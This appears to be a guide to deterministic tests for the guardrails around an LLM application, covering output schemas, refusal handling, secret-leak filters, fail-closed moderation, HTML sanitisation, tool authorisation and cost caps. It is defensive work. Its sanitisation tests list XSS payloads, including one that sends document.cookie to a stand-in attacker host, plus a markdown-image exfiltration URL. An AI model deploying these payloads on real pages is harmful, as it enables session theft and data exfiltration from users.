# Guardrail Checks

Deterministic tests on the code between the model and the world. None of these need a live model call — feed recorded or synthetic model output and assert on the app's behaviour. That makes them fast, free, and suitable for every PR.

## 1. Schema conformance

Every model output crossing a trust boundary parses against a schema, and every way it can fail is a tested case.

```ts
const Result = z.object({
  action: z.enum(['refund', 'escalate', 'close']),
  orderId: z.string().regex(/^ORD-\d{6}$/),
  amount: z.number().positive().max(10_000),
  reason: z.string().min(10).max(500),
});

describe('model output contract', () => {
  it('accepts valid output', () => {
    expect(Result.safeParse(valid).success).toBe(true);
  });

  it.each([
    ['truncated json', '{"action":"refund","orderId":"ORD-1'],
    ['prose around json', 'Sure! Here you go:\n```json\n{...}\n```'],
    ['unknown action', { ...valid, action: 'delete_account' }],
    ['negative amount', { ...valid, amount: -500 }],
    ['amount over cap', { ...valid, amount: 999_999 }],
    ['extra field', { ...valid, __proto__: { admin: true } }],
    ['wrong type', { ...valid, amount: '500' }],
    ['null where string required', { ...valid, reason: null }],
  ])('rejects %s and takes no action', async (_label, output) => {
    const effect = await handleModelOutput(output);
    expect(effect.performed).toBe(false);
    expect(effect.error).toMatch(/invalid model output/i);
  });
});
```

Two assertions on every rejection: it was rejected, **and no side effect occurred**. The second is the one that matters — a rejection that still wrote a row is not a guardrail.

The `amount over cap` case is worth its own note: a schema bound is a business control. `max(10_000)` in the schema is a real limit; the same limit written in the prompt is not.

## 2. Refusal handling

When the model refuses, the app must recognise it as a refusal rather than treating the refusal text as content:

```ts
it('treats a refusal as a refusal, not as a summary', async () => {
  const res = await summarize(input, {
    modelResponse: "I can't help with that request.",
  });
  expect(res.status).toBe('refused');
  expect(res.summary).toBeNull(); // never store the refusal as the summary
});
```

The failure this catches is common and quiet: a refusal string saved to the database as a product description, a ticket summary, or an email body.

## 3. PII and secret leakage

```ts
const FORBIDDEN = [
  /\b\d{3}-\d{2}-\d{4}\b/, // SSN shape
  /\b(?:\d[ -]*?){13,16}\b/, // card shape
  /\bsk-[A-Za-z0-9]{20,}/, // API key shape
  /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
];

it('blocks output containing forbidden patterns', async () => {
  const res = await renderModelOutput('Your card 4111 1111 1111 1111 was charged.');
  expect(res.blocked).toBe(true);
  expect(res.userMessage).not.toContain('4111');
});
```

Also test the inverse — that a legitimate output containing a *reference* to card data (`card ending 1111`) is not blocked. A filter with false positives gets switched off, and then there is no filter.

## 4. Moderation

Test that it is called, that its verdict is honoured, and — most importantly — its failure mode:

```ts
it('fails closed when moderation times out', async () => {
  moderation.mockRejectedValue(new Error('ETIMEDOUT'));
  const res = await publishModelOutput(text);
  expect(res.published).toBe(false); // must not fail open
  expect(res.reason).toBe('moderation_unavailable');
});
```

Fail-open moderation is the default outcome of a naive `try/catch`, and it is indistinguishable from having no moderation on exactly the day the provider has an outage.

## 5. Output rendering

Model output rendered as HTML or markdown is an untrusted-input sink like any other:

```ts
it.each([
  '<script>alert(1)</script>',
  '<img src=x onerror="alert(1)">',
  '[click](javascript:alert(1))',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<iframe src="//evil.example"></iframe>',
  '<div onmouseover="fetch(`//evil.example?c=${document.cookie}`)">hover</div>',
])('sanitises %s', (payload) => {
  const html = renderAssistantMessage(payload);
  expect(html).not.toMatch(/<script|onerror=|onmouseover=|javascript:|<iframe/i);
});
```

Also check what a markdown image or link can do: a model-emitted `![](https://evil.example/log?data=...)` is a data-exfiltration channel that renders silently. If the UI loads remote images from model output, that is a finding on its own.

## 6. Tool-call authorisation

The most important section. Authorisation belongs in the handler, keyed to the *caller's* identity — never to what the model asked for.

```ts
it('rejects a tool call for a resource the user cannot access', async () => {
  const res = await executeToolCall(
    { name: 'get_order', args: { orderId: 'ORD-999999' } }, // belongs to another tenant
    { userId: 'user-1', tenantId: 'tenant-a' },
  );
  expect(res.status).toBe('forbidden');
  expect(res.data).toBeUndefined();
  expect(audit.last()).toMatchObject({ event: 'tool_call_denied', userId: 'user-1' });
});

it('rejects a mutating tool call in a read-only session', async () => {
  const res = await executeToolCall({ name: 'issue_refund', args: { amount: 100 } }, readOnlySession);
  expect(res.status).toBe('forbidden');
});

it('caps the amount a tool can act on regardless of what the model asked', async () => {
  const res = await executeToolCall({ name: 'issue_refund', args: { amount: 1_000_000 } }, session);
  expect(res.status).toBe('rejected');
});
```

The test that reveals the design flaw: **give the model a tool call it should not be allowed to make, and see whether the handler stops it.** If the only thing preventing it is the model choosing not to, there is no control.

## 7. Resource limits

```ts
it('terminates an agent loop at the step cap', async () => {
  const run = await runAgent(promptThatLoopsForever, { maxSteps: 10 });
  expect(run.steps).toBeLessThanOrEqual(10);
  expect(run.status).toBe('step_limit_reached');
});

it('stops at the cost cap', async () => {
  const run = await runAgent(expensivePrompt, { maxCostUsd: 0.5 });
  expect(run.costUsd).toBeLessThanOrEqual(0.5);
});
```

Caps to have and to test: input tokens, output tokens, tool calls per run, agent steps, wall-clock time, cost per run, and requests per user per window. An injection that induces an unbounded loop turns into a bill, and unbounded loops happen without any attacker at all.

## 8. Fail-closed inventory

Go through every guardrail and record what happens when it cannot run:

| Guardrail | Fails to | Correct behaviour |
| --- | --- | --- |
| Schema validation | parse error | no action, error surfaced |
| Moderation | timeout / 5xx | do not publish |
| PII filter | regex engine error | do not publish |
| Tool authorisation | authz service down | deny |
| Retrieval | index unavailable | answer without sources, and say so — never invent |
| Rate limiter | store unavailable | deny or degrade, never unlimited |

Each row needs a test. "Fails open" written in this table is a finding, not a note.

## 9. Logging and replay

```ts
it('records enough to replay a blocked interaction', async () => {
  await handleModelOutput(malformed);
  const entry = audit.last();
  expect(entry).toMatchObject({ event: 'output_rejected', reason: expect.any(String) });
  expect(entry.promptHash).toBeDefined();
  expect(entry.rawOutput).toBeUndefined(); // do not log raw output containing user data
});
```

Enough to investigate, not enough to become the leak. Log the prompt hash, the model, the rejection reason and a truncated redacted excerpt — not the full raw output, which may contain the exact data the filter just blocked.

## Coverage table for the report

| Control | Exists | Tested | Fails closed |
| --- | --- | --- | --- |
| Output schema | yes | yes | yes |
| Refusal handling | yes | **no** | n/a |
| PII filter | yes | yes | yes |
| Moderation | yes | yes | **no — fails open on timeout** |
| HTML sanitisation | yes | yes | yes |
| Tool authorisation | **prompt only** | no | **no** |
| Step / cost caps | no | no | no |

Two rows here are findings before a single adversarial case is run: prompt-only tool authorisation, and moderation that fails open. That table is usually the most valuable artifact this skill produces.
